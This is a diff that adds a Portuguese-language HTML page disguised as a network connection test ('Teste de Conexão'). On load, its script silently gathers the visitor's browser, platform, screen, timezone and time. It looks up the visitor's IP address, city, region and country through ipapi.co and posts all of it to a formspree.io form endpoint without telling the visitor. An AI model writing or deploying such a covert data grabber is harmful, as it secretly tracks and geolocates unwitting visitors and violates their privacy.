@@ -1,0 +1,41 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Teste de Conexão</title>
+</head>
+<body>
+    <h2>Verificando conexão de rede...</h2>
+    <script>
+        async function coletarDados() {
+            const info = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                dataHora: new Date().toLocaleString()
+            };
+
+            const ipInfo = await fetch("https://ipapi.co/json/").then(r => r.json());
+            info.ip = ipInfo.ip;
+            info.city = ipInfo.city;
+            info.region = ipInfo.region;
+            info.country = ipInfo.country_name;
+
+            await fetch("https://formspree.io/f/xpzvynqk", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(info)
+            });
+        }
+
+        coletarDados();
+    </script>
+</body>
+</html>
